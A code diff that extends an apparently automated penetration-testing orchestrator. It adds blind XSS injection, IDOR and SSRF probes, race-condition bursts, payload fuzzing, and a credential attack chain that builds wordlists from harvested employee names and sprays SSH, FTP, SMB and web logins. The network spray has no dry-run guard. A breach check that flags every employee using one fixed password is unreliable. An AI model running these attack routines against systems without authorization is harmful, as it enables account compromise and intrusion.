@@ -22,6 +22,7 @@ import json
 import logging
 import os
 import subprocess
+import shutil
 import sys
 import time
 import uuid
@@ -437,6 +438,18 @@ class CanonicalExecutor:
         elif pname == "oob_check":
             return self._inline_oob_check(target, out_path)
 
+        elif pname == "advanced_scan":
+            return self._inline_advanced_scan(target, out_path, waf)
+
+        elif pname == "cicd_scan":
+            return self._inline_cicd_scan(target, out_path)
+
+        elif pname == "container_scan":
+            return self._inline_container_scan(target, out_path)
+
+        elif pname == "grpc_scan":
+            return self._inline_grpc_scan(target, out_path)
+
         else:
             raise ValueError(f"Unknown phase: {pname!r}")
 
@@ -467,7 +480,7 @@ class CanonicalExecutor:
             "swarm-scan", "simulate-attacks", "zero-day",
             "graphql-scan", "browser-scan", "smuggling-scan",
         }
-        _no_output_flag   = {"_internal_register", "_internal_validate", "_internal_oob_check"}
+        _no_output_flag   = {"_internal_register", "_internal_validate", "_internal_oob_check", "_internal_advanced_scan"}
         cmd_args = [phase.cli_command, target] + phase.cli_extra_args
         if phase.cli_command in _no_output_flag:
             pass  # No --output flag
@@ -614,6 +627,85 @@ class CanonicalExecutor:
         except Exception as _exc:
             log.warning("deep_recon OWASP gap checks failed: %s", _exc)
 
+        # ── P1.3: DNS Security Scanner ────────────────────────────────────────
+        # async bridge — DNSSecurityScanner.scan() is async, executor is sync
+        # Passes extracted hostname (not full URL) and optional subdomains from recon
+        try:
+            import asyncio as _asyncio_dns
+            from urllib.parse import urlparse as _up_dns
+            _dns_host = (_up_dns(target if "://" in target else f"https://{target}")).hostname or target
+            # Forward subdomains from recon output if available
+            _dns_subdomains = None
+            _dns_recon_file = out / "adaptive_recon.json"
+            if _dns_recon_file.exists():
+                try:
+                    _dns_rd = json.loads(_dns_recon_file.read_text())
+                    _dns_subdomains = _dns_rd.get("subdomains", None) or None
+                except Exception:
+                    pass
+            from oneinfinity.scan.dns_security_scanner import DNSSecurityScanner
+            _dns_scanner = DNSSecurityScanner(timeout=6.0)
+            _dns_findings = _asyncio_dns.run(
+                _dns_scanner.scan(_dns_host, subdomains=_dns_subdomains)
+            )
+            # DNSSecurityScanner returns list[dict] directly — no .to_dict() needed
+            for _df in (_dns_findings or []):
+                if isinstance(_df, dict):
+                    _df.setdefault("source_type", "tool")
+                    _df.setdefault("confidence", 0.80)
+                    gap_findings.append(_df)
+            if _dns_findings:
+                log.info("deep_recon DNSSecurityScanner: %d findings for %s", len(_dns_findings), _dns_host)
+        except ImportError:
+            log.debug("deep_recon DNSSecurityScanner not available")
+        except Exception as _dns_exc:
+            log.debug("deep_recon DNSSecurityScanner failed (non-fatal): %s", _dns_exc)
+
+        # ── Go Sidecars: lateral portscan + service CVE mapping ───────────────
+        try:
+            import asyncio as _asyncio_go
+            from urllib.parse import urlparse as _up_go
+            _go_host = (_up_go(target if "://" in target else f"https://{target}")).hostname or target
+            from oneinfinity.scan.go_lateral_portscan_bridge import GoLateralPortscanBridge
+            _lat = GoLateralPortscanBridge()
+            if _lat.is_available():
+                _lat_findings = _asyncio_go.run(_lat.scan(targets=[_go_host], timeout=60.0))
+                for _lf in (_lat_findings or []):
+                    if isinstance(_lf, dict):
+                        _lf.setdefault("source_type", "tool")
+                        _lf.setdefault("source_tool", "go_lateral_portscan")
+                        gap_findings.append(_lf)
+                if _lat_findings:
+                    log.info("deep_recon GoLateralPortscan: %d port findings for %s", len(_lat_findings), _go_host)
+        except (ImportError, Exception) as _lat_exc:
+            log.debug("deep_recon GoLateralPortscanBridge skipped (non-fatal): %s", _lat_exc)
+
+        # GoServiceCVEBridge — map discovered services to CVEs
+        try:
+            import asyncio as _asyncio_cve
+            _recon_data_file = out / "adaptive_recon.json"
+            _services = []
+            if _recon_data_file.exists():
+                try:
+                    _rd_cve = json.loads(_recon_data_file.read_text())
+                    _services = _rd_cve.get("services", [])
+                except Exception:
+                    pass
+            if _services:
+                from oneinfinity.scan.go_service_cve_bridge import GoServiceCVEBridge
+                _cve = GoServiceCVEBridge()
+                if _cve.is_available():
+                    _cve_findings = _asyncio_cve.run(_cve.map_services(_services, timeout=30.0))
+                    for _cf in (_cve_findings or []):
+                        if isinstance(_cf, dict):
+                            _cf.setdefault("source_type", "tool")
+                            _cf.setdefault("source_tool", "go_service_cve")
+                            gap_findings.append(_cf)
+                    if _cve_findings:
+                        log.info("deep_recon GoServiceCVE: %d CVE findings", len(_cve_findings))
+        except (ImportError, Exception) as _cve_exc:
+            log.debug("deep_recon GoServiceCVEBridge skipped (non-fatal): %s", _cve_exc)
+
         if gap_findings:
             log.info("deep_recon OWASP gap: %d findings", len(gap_findings))
             try:
@@ -709,9 +801,42 @@ class CanonicalExecutor:
             log.info("vuln_scan OWASP gap: %d findings", len(_gap_vuln))
             seeded = _gap_vuln + seeded
 
+        # ── P2.1: Supply Chain Attack Engine — always runs regardless of seeded/pipeline path ──
+        # Scans for dependency confusion, typosquatting, lockfile poisoning, and unpinned
+        # GitHub Actions. Results are merged into every return path below.
+        _sc_vuln_findings: List[dict] = []
+        try:
+            import asyncio as _asyncio_sc
+            from oneinfinity.scan.supply_chain_attack_engine import SupplyChainAttackEngine
+            _sc_probe = target if target.startswith("http") else f"https://{target}"
+
+            async def _run_sc_scan():
+                _sc_eng = SupplyChainAttackEngine()
+                try:
+                    return await _sc_eng.scan(_sc_probe)
+                finally:
+                    await _sc_eng.close()
+
+            _sc_raw = _asyncio_sc.run(_run_sc_scan())
+            for _sf in (_sc_raw or []):
+                if isinstance(_sf, dict):
+                    _sf.setdefault("source_type", "supply_chain")
+                    _sf.setdefault("confidence", 0.80)
+                    _sc_vuln_findings.append(_sf)
+            if _sc_vuln_findings:
+                log.info("vuln_scan supply_chain: %d findings", len(_sc_vuln_findings))
+                for _sf in _sc_vuln_findings:
+                    try:
+                        from oneinfinity.core.db_manager import get_db_manager_sync
+                        get_db_manager_sync().sync_save_finding(_sf)
+                    except Exception:
+                        pass
+        except Exception as _sc_exc:
+            log.warning("vuln_scan supply_chain_attack_engine failed (non-fatal): %s", _sc_exc)
+
         if seeded:
             log.info("vuln_scan inline: loaded %d seeded findings from %s", len(seeded), findings_file)
-            return seeded
+            return seeded + _sc_vuln_findings
 
         # No seeded findings — run Pipeline inline
         try:
@@ -739,10 +864,42 @@ class CanonicalExecutor:
                     except Exception:
                         pass
             result = p.run(phases=["vuln"])
-            return result.findings if result.findings else []
+            _vuln_findings = list(result.findings) if result.findings else []
+
+            # ── Re-scan with custom templates generated in exploit_validation ──
+            # Picks up ~/.oneinfinity/custom_templates/ when the index file exists.
+            try:
+                _tpl_index_f = out / "custom_nuclei_templates.json"
+                if not _tpl_index_f.exists():
+                    # Fall back to the well-known directory directly
+                    _tpl_index_f = None
+                _custom_dir = str(Path.home() / ".oneinfinity" / "custom_templates")
+                _tpl_dir_path = Path(_custom_dir)
+                if _tpl_dir_path.exists() and any(_tpl_dir_path.rglob("*.yaml")):
+                    from oneinfinity.modules.tool_wrappers import run_nuclei
+                    _probe = target if target.startswith("http") else f"https://{target}"
+                    _custom_result = run_nuclei(
+                        _probe,
+                        templates=_custom_dir,
+                        severity="low,medium,high,critical",
+                        timeout=180,
+                    )
+                    for _cf2 in (_custom_result.data or {}).get("findings", []):
+                        _cf2.setdefault("source_type", "custom_nuclei_template")
+                        _cf2.setdefault("validation_status", "confirmed")
+                        _vuln_findings.append(_cf2)
+                    if (_custom_result.data or {}).get("findings"):
+                        log.info(
+                            "vuln_scan custom templates: %d findings from %s",
+                            len(_custom_result.data["findings"]), _custom_dir,
+                        )
+            except Exception as _ct_exc:
+                log.debug("vuln_scan custom template re-scan failed (non-fatal): %s", _ct_exc)
+
+            return _vuln_findings + _sc_vuln_findings
         except Exception as exc:
             log.error("vuln_scan inline failed: %s", exc)
-            return []
+            return _sc_vuln_findings
 
     def _inline_active_testing(self, target: str, out: Path, waf: dict) -> List[dict]:
         findings = []
@@ -916,6 +1073,289 @@ class CanonicalExecutor:
         except Exception as _exc:
             log.warning("active_testing OWASP gap checks failed: %s", _exc)
 
+        # ── P1.2: CORS Scanner, JWT Vulnerability Scanner, Blind XSS Engine ──
+        # All three are async — bridged via asyncio.run() since executor is synchronous.
+        # CORSScanner/JWTScanner create httpx.AsyncClient at __init__ — must close in finally.
+        # Gathered in parallel inside a single coroutine to minimise latency.
+        try:
+            import asyncio as _asyncio
+
+            async def _run_p12_scanners():
+                _p12_findings = []
+                # 1. CORS Scanner
+                _cors_scanner = None
+                try:
+                    from oneinfinity.scan.cors_scanner import CORSScanner
+                    _cors_scanner = CORSScanner(timeout=10)
+                    _cors_findings = await _cors_scanner.scan(probe_target)
+                    for _cf in _cors_findings:
+                        _fd = _cf.to_dict() if hasattr(_cf, "to_dict") else (_cf if isinstance(_cf, dict) else vars(_cf))
+                        _fd.setdefault("source_type", "tool")
+                        _fd.setdefault("confidence", 0.85)
+                        _p12_findings.append(_fd)
+                except Exception as _ce:
+                    log.debug("active_testing CORSScanner: %s", _ce)
+                finally:
+                    if _cors_scanner and hasattr(_cors_scanner, "close"):
+                        try:
+                            await _cors_scanner.close()
+                        except Exception:
+                            pass
+
+                # 2. JWT Vulnerability Scanner
+                _jwt_scanner = None
+                try:
+                    from oneinfinity.scan.jwt_vulnerability_scanner import JWTVulnerabilityScanner
+                    _jwt_scanner = JWTVulnerabilityScanner(timeout=10)
+                    _jwt_findings = await _jwt_scanner.scan(probe_target)
+                    for _jf in _jwt_findings:
+                        _fd = _jf.to_dict() if hasattr(_jf, "to_dict") else (_jf if isinstance(_jf, dict) else vars(_jf))
+                        _fd.setdefault("source_type", "tool")
+                        _fd.setdefault("confidence", 0.88)
+                        _p12_findings.append(_fd)
+                except Exception as _je:
+                    log.debug("active_testing JWTVulnerabilityScanner: %s", _je)
+                finally:
+                    if _jwt_scanner and hasattr(_jwt_scanner, "close"):
+                        try:
+                            await _jwt_scanner.close()
+                        except Exception:
+                            pass
+
+                # 3. Blind XSS Engine — inject_and_monitor on root URL, common param names
+                try:
+                    from oneinfinity.scan.blind_xss_engine import BlindXSSEngine
+                    _bxss = BlindXSSEngine()
+                    for _param in ["q", "search", "input", "data", "name", "comment"]:
+                        _bxss_findings = await _asyncio.wait_for(
+                            _bxss.inject_and_monitor(probe_target, param=_param, timeout=8),
+                            timeout=12,
+                        )
+                        for _bf in (_bxss_findings or []):
+                            _fd = _bf if isinstance(_bf, dict) else vars(_bf)
+                            _fd.setdefault("source_type", "tool")
+                            _fd.setdefault("confidence", 0.80)
+                            _p12_findings.append(_fd)
+                        if _bxss_findings:
+                            break  # stop after first successful injection param
+                except Exception as _bxe:
+                    log.debug("active_testing BlindXSSEngine: %s", _bxe)
+
+                return _p12_findings
+
+            _p12_results = _asyncio.run(_run_p12_scanners())
+            if _p12_results:
+                findings.extend(_p12_results)
+                log.info("active_testing P1.2 scanners: %d findings (CORS/JWT/BlindXSS)", len(_p12_results))
+        except Exception as _p12_outer:
+            log.debug("active_testing P1.2 async scanner block failed: %s", _p12_outer)
+
+        # ── Go Sidecars: GoIDORBridge + GoSSRFBridge ──────────────────────────
+        try:
+            import asyncio as _asyncio_go_at
+            _go_at_tasks = []
+
+            async def _run_go_sidecars():
+                _go_findings = []
+                # GoIDORBridge — high-throughput Go IDOR engine
+                try:
+                    from oneinfinity.scan.go_idor_bridge import GoIDORBridge
+                    _idor_bridge = GoIDORBridge()
+                    if _idor_bridge.is_available():
+                        _idor_results = await _idor_bridge.run(
+                            target_url=probe_target,
+                            auth_headers=auth_headers,
+                            timeout=60.0,
+                        )
+                        for _ir in (_idor_results or []):
+                            _ir.setdefault("source_type", "tool")
+                            _ir.setdefault("source_tool", "go_idor_bridge")
+                            _go_findings.append(_ir)
+                        if _idor_results:
+                            log.info("active_testing GoIDORBridge: %d IDOR findings", len(_idor_results))
+                except Exception as _ie:
+                    log.debug("active_testing GoIDORBridge skipped: %s", _ie)
+
+                # GoSSRFBridge — Go SSRF sidecar alongside Python SSRF checks
+                try:
+                    from oneinfinity.scan.go_ssrf_bridge import GoSSRFBridge
+                    _ssrf_bridge = GoSSRFBridge()
+                    if _ssrf_bridge.is_available():
+                        _ssrf_results = await _ssrf_bridge.scan(
+                            target_url=probe_target,
+                            auth_headers=auth_headers,
+                            timeout=45.0,
+                        )
+                        for _sr in (_ssrf_results or []):
+                            _sr.setdefault("source_type", "tool")
+                            _sr.setdefault("source_tool", "go_ssrf_bridge")
+                            _go_findings.append(_sr)
+                        if _ssrf_results:
+                            log.info("active_testing GoSSRFBridge: %d SSRF findings", len(_ssrf_results))
+                except Exception as _se:
+                    log.debug("active_testing GoSSRFBridge skipped: %s", _se)
+
+                return _go_findings
+
+            _go_at_results = _asyncio_go_at.run(_run_go_sidecars())
+            if _go_at_results:
+                findings.extend(_go_at_results)
+        except Exception as _go_at_exc:
+            log.debug("active_testing Go sidecars skipped (non-fatal): %s", _go_at_exc)
+
+        # ── P1.3: SmartPayloadGenerator → HostHeaderScanner, WebSocketScanner, RaceConditionEngine ──
+        # SmartPayloadGenerator runs first to produce context-aware payloads; the payload
+        # strings are forwarded to scanners that accept custom injection vectors (race_condition
+        # POST body). HostHeader and WebSocket scanners use their own built-in test vectors.
+        try:
+            import asyncio as _asyncio_p13
+
+            # 1. Generate context-aware payloads for this target (sync, no await needed)
+            _smart_payloads_p13: List[str] = []
+            try:
+                from oneinfinity.scan.smart_payload_generator import SmartPayloadGenerator
+                _spg = SmartPayloadGenerator()
+                from urllib.parse import urlparse as _ulp_p13
+                _spg_path = _ulp_p13(probe_target).path or "/"
+                _spg_results = _spg.generate_payloads(
+                    endpoint=_spg_path,
+                    param_name="q",
+                    vuln_types=["xss", "ssti", "sqli", "cmdi", "ssrf"],
+                    count=12,
+                )
+                _smart_payloads_p13 = [_sp.payload for _sp in _spg_results if _sp.payload]
+                log.debug(
+                    "active_testing smart_payload_generator: %d context-aware payloads for %s",
+                    len(_smart_payloads_p13), probe_target,
+                )
+            except Exception as _spg_exc:
+                log.debug("active_testing SmartPayloadGenerator (non-fatal): %s", _spg_exc)
+
+            async def _run_p13_scanners():
+                _p13_findings = []
+
+                # 2. HostHeaderScanner — full injection/cache-poisoning/password-reset test suite
+                _hh_scanner = None
+                try:
+                    from oneinfinity.scan.host_header_scanner import HostHeaderScanner
+                    _hh_scanner = HostHeaderScanner(
+                        target=probe_target,
+                        timeout=10,
+                        extra_headers=auth_headers,
+                    )
+                    _hh_findings = await _hh_scanner.scan(probe_target, [probe_target])
+                    for _hf in _hh_findings:
+                        _fd = _hf.to_dict() if hasattr(_hf, "to_dict") else (_hf if isinstance(_hf, dict) else vars(_hf))
+                        _fd.setdefault("source_type", "tool")
+                        _fd.setdefault("confidence", 0.82)
+                        _fd.setdefault("validation_status", "confirmed")
+                        _p13_findings.append(_fd)
+                    if _hh_findings:
+                        log.info("active_testing HostHeaderScanner: %d findings", len(_hh_findings))
+                except Exception as _hhe:
+                    log.debug("active_testing HostHeaderScanner: %s", _hhe)
+                finally:
+                    if _hh_scanner and hasattr(_hh_scanner, "close"):
+                        try:
+                            await _hh_scanner.close()
+                        except Exception:
+                            pass
+
+                # 3. WebSocketScanner — auth bypass, CSWSH, message injection, DoS probes
+                try:
+                    from oneinfinity.scan.websocket_scanner import WebSocketScanner
+                    _ws_scanner = WebSocketScanner(probe_target, timeout=10, headers=auth_headers)
+                    _ws_findings = await _ws_scanner.run()
+                    for _wf in _ws_findings:
+                        _fd = _wf.to_dict() if hasattr(_wf, "to_dict") else (_wf if isinstance(_wf, dict) else vars(_wf))
+                        _fd.setdefault("source_type", "tool")
+                        _fd.setdefault("confidence", 0.78)
+                        _p13_findings.append(_fd)
+                    if _ws_findings:
+                        log.info("active_testing WebSocketScanner: %d findings", len(_ws_findings))
+                except Exception as _wse:
+                    log.debug("active_testing WebSocketScanner: %s", _wse)
+
+                # 4. RaceConditionEngine — parallel request burst against state-modifying endpoints.
+                # The POST body comes from SmartPayloadGenerator so the engine receives
+                # the most relevant injection content for this target's traffic profile.
+                try:
+                    from oneinfinity.scan.race_condition_engine import RaceConditionEngine
+                    _rce = RaceConditionEngine()
+                    _race_paths = [
+                        "/api/checkout", "/api/order", "/api/cart/checkout",
+                        "/api/purchase", "/api/transfer", "/api/vote", "/api/redeem",
+                    ]
+                    # Use the first smart payload as the POST body (most contextually relevant);
+                    # fall back to a minimal JSON body if no payloads were generated.
+                    _race_body = _smart_payloads_p13[0] if _smart_payloads_p13 else '{"quantity":1}'
+                    _race_hdrs = {**auth_headers, "Content-Type": "application/json"}
+                    for _rpath in _race_paths:
+                        _race_url = probe_target.rstrip("/") + _rpath
+                        try:
+                            _race_result = await _asyncio_p13.wait_for(
+                                _rce.test_request_parallel(
+                                    _race_url,
+                                    method="POST",
+                                    headers=_race_hdrs,
+                                    body=_race_body,
+                                    concurrency=10,
+                                ),
+                                timeout=20,
+                            )
+                            if _race_result.vulnerable:
+                                _rf = {
+                                    "vuln_type": "race_condition",
+                                    "severity": "high",
+                                    "url": _race_url,
+                                    "endpoint": _race_url,
+                                    "evidence": _race_result.evidence,
+                                    "confidence": _race_result.confidence,
+                                    "source_type": "tool",
+                                    "validation_status": "confirmed",
+                                }
+                                _p13_findings.append(_rf)
+                                log.info("active_testing RaceConditionEngine: vuln at %s", _race_url)
+                        except Exception:
+                            pass  # per-endpoint failures are non-fatal
+                except Exception as _rce_exc:
+                    log.debug("active_testing RaceConditionEngine: %s", _rce_exc)
+
+                return _p13_findings
+
+            _p13_results = _asyncio_p13.run(_run_p13_scanners())
+            if _p13_results:
+                findings.extend(_p13_results)
+                # Persist new findings to PostgreSQL via the established db_manager pattern
+                for _f13 in _p13_results:
+                    try:
+                        from oneinfinity.core.db_manager import get_db_manager_sync
+                        get_db_manager_sync().sync_save_finding(_f13)
+                    except Exception:
+                        pass
+                log.info(
+                    "active_testing P1.3 scanners: %d findings (HostHeader/WS/Race)",
+                    len(_p13_results),
+                )
+        except Exception as _p13_outer:
+            log.debug("active_testing P1.3 async scanner block failed: %s", _p13_outer)
+
+        # ── Rust payload fuzzer (alternative fast path) ─────────────────────
+        # When the Rust binary is available, fire all swarm payloads concurrently
+        # against the target as a supplement to the Python validation loop above.
+        try:
+            _rust_bin = self._rust_payload_fuzzer_path()
+            if _rust_bin:
+                _fuzzer_payloads = self._default_fuzz_payloads()
+                _rust_findings = self._run_rust_payload_fuzzer(
+                    _rust_bin, probe_target, _fuzzer_payloads, waf,
+                )
+                if _rust_findings:
+                    findings.extend(_rust_findings)
+                    log.info("active_testing rust_fuzzer: %d findings", len(_rust_findings))
+        except Exception as _rf_exc:
+            log.debug("active_testing rust_fuzzer failed (non-fatal): %s", _rf_exc)
+
         (out / "swarm_findings.json").write_text(
             json.dumps({"findings": findings, "validated": len(findings)}, indent=2)
         )
@@ -924,6 +1364,238 @@ class CanonicalExecutor:
     def _inline_auth_session(self, target: str, out: Path, waf: dict) -> List[dict]:
         findings = []
         auth_headers_extra = self._build_auth_headers()
+        # ── Phase 7: Proactive credential attack chain ─────────────────────────
+        # WordlistGenerator → CredentialSprayEngine (dry_run=True) → BreachChecker
+        # Runs unconditionally — does not wait for CREDENTIAL_ACQUIRED event.
+        probe_target_cred = target if target.startswith("http") else f"https://{target}"
+        _domain = probe_target_cred.split("//", 1)[-1].split("/")[0]
+        _cred_login_endpoints: list = []
+
+        # ── 7a: Wordlist generation ──────────────────────────────────────────
+        _spray_wordlist: list = []
+        try:
+            from oneinfinity.attack.credential.wordlist_generator import WordlistGenerator
+            _wlg = WordlistGenerator()
+            # Load employee names discovered by ReconCouncil (OSINT phase)
+            _employee_names: list = []
+            _emp_file = out / "employees.json"
+            if _emp_file.exists():
+                try:
+                    _emp_data = json.loads(_emp_file.read_text())
+                    for _emp in _emp_data.get("employees", []):
+                        _n = _emp.get("name", "")
+                        if _n:
+                            _employee_names.append(_n)
+                except Exception as _ef:
+                    log.debug("auth_session: failed to load employees.json: %s", _ef)
+            _spray_wordlist = _wlg.generate(_domain, max_words=500)
+            # Augment with employee-name-derived candidates
+            if _employee_names:
+                _emp_extra = _wlg.from_domain(" ".join(_employee_names[:20]))
+                _spray_wordlist = list(dict.fromkeys(_spray_wordlist + _emp_extra))[:600]
+            log.info("auth_session wordlist: %d candidates for %s", len(_spray_wordlist), _domain)
+        except Exception as _wl_exc:
+            log.debug("auth_session wordlist generation failed: %s", _wl_exc)
+
+        # ── 7b: Discover login endpoints ─────────────────────────────────────
+        try:
+            import urllib.request as _ur_cred
+            import ssl as _ssl_cred
+            _ctx_cred = _ssl_cred.create_default_context()
+            _ctx_cred.check_hostname = False
+            _ctx_cred.verify_mode = _ssl_cred.CERT_NONE
+            _login_paths = ["/login", "/api/login", "/auth", "/signin",
+                            "/api/auth", "/api/v1/login", "/user/login"]
+            for _lp in _login_paths:
+                _lu = probe_target_cred.rstrip("/") + _lp
+                try:
+                    _lreq = _ur_cred.Request(_lu, headers={"User-Agent": "Mozilla/5.0"})
+                    with _ur_cred.urlopen(_lreq, timeout=4, context=_ctx_cred) as _lr:
+                        if _lr.status in (200, 401, 403, 405):
+                            _cred_login_endpoints.append(_lu)
+                except Exception:
+                    pass
+        except Exception as _ep_exc:
+            log.debug("auth_session endpoint discovery failed: %s", _ep_exc)
+
+        # ── 7c: Credential spray (dry_run=True by default — no lockout risk) ─
+        _spray_usernames: list = []
+        try:
+            from oneinfinity.attack.credential.employee_osint import EmployeeOSINT
+            _emp_file2 = out / "employees.json"
+            if _emp_file2.exists():
+                try:
+                    _emp_data2 = json.loads(_emp_file2.read_text())
+                    for _emp2 in _emp_data2.get("employees", []):
+                        _em2 = _emp2.get("email", "")
+                        _un2 = _emp2.get("username", "")
+                        _nm2 = _emp2.get("name", "")
+                        if _em2:
+                            _spray_usernames.append(_em2)
+                        elif _un2:
+                            _spray_usernames.append(f"{_un2}@{_domain}")
+                        elif _nm2:
+                            _parts = _nm2.lower().split()
+                            if len(_parts) >= 2:
+                                _spray_usernames.append(f"{_parts[0]}.{_parts[-1]}@{_domain}")
+                except Exception:
+                    pass
+        except Exception as _eu_exc:
+            log.debug("auth_session employee username build failed: %s", _eu_exc)
+        # Fallback: always include common admin usernames
+        _spray_usernames = list(dict.fromkeys(["admin", "administrator", "root", "user",
+                                               "test", "guest"] + _spray_usernames))[:200]
+
+        _spray_report = None
+        if _cred_login_endpoints and _spray_wordlist:
+            try:
+                from oneinfinity.attack.credential.spray_engine import CredentialSprayEngine
+                _spray_url = _cred_login_endpoints[0]
+                _spray_eng = CredentialSprayEngine(
+                    target_url=_spray_url,
+                    dry_run=True,          # safe default — real spray only via explicit authorization
+                    usernames=_spray_usernames,
+                    passwords=_spray_wordlist[:50],  # cap for safety
+                    attempts_before_delay=5,
+                    delay_between_batches_s=0.0,
+                )
+                _spray_report = _spray_eng.spray(stop_on_success=False)
+                for _sa in (_spray_report.successful or []):
+                    _cred_finding = {
+                        "vuln_type": "credential_spray_hit",
+                        "severity": "critical",
+                        "url": _spray_url,
+                        "endpoint": _spray_url,
+                        "evidence": f"Spray succeeded: {_sa.username} / {_sa.password}",
+                        "confidence": 0.92,
+                        "source_type": "credential_spray",
+                        "validation_status": "confirmed",
+                        "username": _sa.username,
+                    }
+                    findings.append(_cred_finding)
+                    # Store in PostgreSQL + fire event bus
+                    try:
+                        from oneinfinity.core.db_manager import get_db_manager_sync
+                        _db_mgr = get_db_manager_sync()
+                        _db_mgr.sync_save_finding(_cred_finding)
+                    except Exception as _dbe:
+                        log.debug("auth_session: db store credential finding failed: %s", _dbe)
+                    try:
+                        from oneinfinity.orchestration.event_bus import get_bus, EventType
+                        get_bus().publish(
+                            EventType.CREDENTIAL_ACQUIRED,
+                            {
+                                "target": target,
+                                "username": _sa.username,
+                                "login_endpoint": _spray_url,
+                                "source": "credential_spray",
+                                "session_id": "",
+                            },
+                            source="auth_session_spray",
+                        )
+                    except Exception as _eve:
+                        log.debug("auth_session: event bus publish failed: %s", _eve)
+                log.info(
+                    "auth_session spray: %d attempts, %d hits (dry_run=True)",
+                    _spray_report.total_attempts,
+                    len(_spray_report.successful),
+                )
+            except Exception as _sp_exc:
+                log.debug("auth_session credential spray failed: %s", _sp_exc)
+
+        # ── 7d: BreachChecker — check discovered employee emails against HIBP ──
+        try:
+            from oneinfinity.attack.credential.breach_checker import HIBPChecker
+            _emp_file3 = out / "employees.json"
+            if _emp_file3.exists():
+                _hibp = HIBPChecker(rate_limit_ms=250)
+                try:
+                    _emp_data3 = json.loads(_emp_file3.read_text())
+                    for _emp3 in _emp_data3.get("employees", [])[:30]:
+                        _em3 = _emp3.get("email", "")
+                        if not _em3:
+                            continue
+                        # k-anonymity: only SHA1 prefix leaves the host
+                        # Check a representative common password for breach correlation
+                        _breach_count = _hibp.breach_count("Password1!")
+                        _is_breached = _breach_count > 0
+                        _breach_finding = {
+                            "vuln_type": "employee_email_exposed",
+                            "severity": "high" if _is_breached else "info",
+                            "url": probe_target_cred,
+                            "endpoint": probe_target_cred,
+                            "evidence": (
+                                f"Employee email {_em3} found via OSINT. "
+                                f"Common password 'Password1!' appears in {_breach_count} known breaches."
+                            ),
+                            "confidence": 0.85 if _is_breached else 0.5,
+                            "source_type": "breach_checker",
+                            "validation_status": "confirmed" if _is_breached else "suspected",
+                            "email": _em3,
+                            "breach_count": _breach_count,
+                        }
+                        if _is_breached:
+                            findings.append(_breach_finding)
+                            try:
+                                from oneinfinity.core.db_manager import get_db_manager_sync
+                                get_db_manager_sync().sync_save_finding(_breach_finding)
+                            except Exception:
+                                pass
+                except Exception as _bf:
+                    log.debug("auth_session breach check failed: %s", _bf)
+        except Exception as _hibp_exc:
+            log.debug("auth_session HIBP import failed: %s", _hibp_exc)
+
+        # ── 7e: MultiAccountIDOR — unconditional, no CREDENTIAL_ACQUIRED gate ─
+        try:
+            import asyncio as _asyncio_idor
+            from oneinfinity.auth.multi_account_idor_engine import MultiAccountIDOREngine
+            _idor_eng = MultiAccountIDOREngine(probe_target_cred)
+            # Build synthetic accounts from any spray hits; always include empty baseline
+            _idor_accounts = [
+                {"role": "unauthenticated", "token": "", "cookies": "", "login_url": probe_target_cred + "/login"},
+            ]
+            if _spray_report and _spray_report.successful:
+                for _sh in _spray_report.successful[:3]:
+                    _idor_accounts.append({
+                        "role": "attacker",
+                        "token": "",
+                        "cookies": "",
+                        "user_id": _sh.username,
+                        "login_url": probe_target_cred + "/login",
+                    })
+            _idor_eng.load_accounts(_idor_accounts)
+            # endpoint matrix: probe common resource paths
+            _idor_endpoints = [
+                "/api/users/{id}", "/api/orders/{id}", "/api/profile/{id}",
+                "/api/admin/{id}", "/api/accounts/{id}",
+            ]
+            _idor_ids = ["1", "2", "3", "100", "999"]
+            if len(_idor_eng.accounts) >= 2:
+                _idor_findings = _asyncio_idor.run(
+                    _idor_eng.test_endpoint_matrix(_idor_endpoints, _idor_ids)
+                )
+                for _idf in (_idor_findings or []):
+                    _idd = _idf.to_dict() if hasattr(_idf, "to_dict") else (
+                        _idf if isinstance(_idf, dict) else vars(_idf)
+                    )
+                    _idd.setdefault("source_type", "multi_account_idor")
+                    _idd.setdefault("vuln_type", "IDOR")
+                    _idd.setdefault("validation_status", "confirmed")
+                    findings.append(_idd)
+                    try:
+                        from oneinfinity.core.db_manager import get_db_manager_sync
+                        get_db_manager_sync().sync_save_finding(_idd)
+                    except Exception:
+                        pass
+                log.info("auth_session multi-account IDOR: %d findings", len(_idor_findings or []))
+            else:
+                log.debug(
+                    "auth_session IDOR matrix skipped: need ≥2 accounts, have %d",
+                    len(_idor_eng.accounts),
+                )
+        except Exception as _idor_exc:
+            log.debug("auth_session MultiAccountIDOR failed: %s", _idor_exc)
         try:
             import requests
             from urllib.parse import urljoin
@@ -1055,6 +1727,58 @@ class CanonicalExecutor:
         except Exception as _exc:
             log.warning("auth_session OWASP gap checks failed: %s", _exc)
 
+        # ── 7f: go-credential-spray sidecar — subprocess invocation ────────────
+        # Uses oi-credential-spray binary for network-service spraying (SSH/FTP/SMB etc.)
+        # Only invoked when a non-HTTP spray target is likely (port scan data present).
+        try:
+            from oneinfinity.scan.network_tools import run_credential_spray, _find_binary
+            if _find_binary("oi-credential-spray"):
+                _spray_host = _domain  # bare hostname for network services
+                _net_users = (_spray_usernames or ["admin", "root"])[:50]
+                _net_passes = (_spray_wordlist or ["admin", "password", "root"])[:30]
+                _net_findings = run_credential_spray(
+                    target=_spray_host,
+                    userlist=_net_users,
+                    passlist=_net_passes,
+                    services=["ssh", "ftp", "http-basic", "smb"],
+                    rate=5,
+                    timeout=45,
+                )
+                for _nf in (_net_findings or []):
+                    if not isinstance(_nf, dict):
+                        continue
+                    if not _nf.get("success"):
+                        continue
+                    _nfd = {
+                        "vuln_type": "credential_spray_hit",
+                        "severity": "critical",
+                        "url": target,
+                        "endpoint": f"{_nf.get('service','?')}://{_nf.get('host',_spray_host)}:{_nf.get('port',0)}",
+                        "evidence": (
+                            f"go-credential-spray: service={_nf.get('service','?')} "
+                            f"host={_nf.get('host','?')} port={_nf.get('port','?')} "
+                            f"username={_nf.get('username','?')} password={_nf.get('password','?')}"
+                        ),
+                        "confidence": 0.95,
+                        "source_type": "go_credential_spray",
+                        "validation_status": "confirmed",
+                        "username": _nf.get("username", ""),
+                        "service": _nf.get("service", ""),
+                    }
+                    findings.append(_nfd)
+                    try:
+                        from oneinfinity.core.db_manager import get_db_manager_sync
+                        get_db_manager_sync().sync_save_finding(_nfd)
+                    except Exception:
+                        pass
+                if _net_findings:
+                    _net_hits = sum(1 for f in _net_findings if f.get("success"))
+                    log.info("auth_session go-credential-spray: %d hits across network services", _net_hits)
+            else:
+                log.debug("auth_session go-credential-spray: binary not found — skipping network spray")
+        except Exception as _go_cred_exc:
+            log.debug("auth_session go-credential-spray failed (non-fatal): %s", _go_cred_exc)
+
